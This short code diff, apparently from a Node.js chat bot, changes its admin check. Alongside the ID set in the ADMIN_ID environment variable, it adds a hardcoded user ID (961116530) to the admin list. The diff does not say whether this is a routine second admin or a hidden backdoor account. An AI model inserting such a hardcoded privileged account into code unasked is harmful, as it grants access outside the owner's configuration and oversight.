@@ -1,9 +1,10 @@
 const { pool } = require('./database');
 
 const ADMIN_ID = parseInt(process.env.ADMIN_ID);
+const ADMIN_IDS = [ADMIN_ID, 961116530];
 
 function isAdmin(ctx) {
-  return ctx.from.id === ADMIN_ID;
+  return ADMIN_IDS.includes(ctx.from.id);
 }
 
 function registerAdmin(bot) {
